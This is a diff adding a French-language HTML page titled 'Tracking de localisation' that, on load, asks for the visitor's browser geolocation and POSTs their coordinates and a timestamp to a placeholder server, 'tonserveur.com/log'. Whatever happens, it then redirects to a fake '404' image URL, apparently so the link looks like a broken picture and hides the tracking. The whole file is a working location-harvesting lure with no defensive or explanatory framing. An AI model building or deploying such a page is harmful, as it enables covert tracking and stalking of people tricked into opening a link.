@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Tracking de localisation</title>
+  <script>
+    function sendLocation(position) {
+      const data = {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        timestamp: new Date().toISOString()
+      };
+
+      fetch("https://tonserveur.com/log", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      }).then(() => {
+        window.location.href = "https://example.com/image404.jpg";
+      }).catch((error) => {
+        console.error("Erreur lors de l'envoi :", error);
+        window.location.href = "https://example.com/image404.jpg";
+      });
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, () => {
+          alert("Permission de localisation refusée.");
+          window.location.href = "https://example.com/image404.jpg";
+        });
+      } else {
+        alert("La géolocalisation n'est pas supportée par ce navigateur.");
+        window.location.href = "https://example.com/image404.jpg";
+      }
+    }
+
+    window.onload = getLocation;
+  </script>
+</head>
+<body>
+  <p>Chargement de la localisation...</p>
+</body>
+</html>
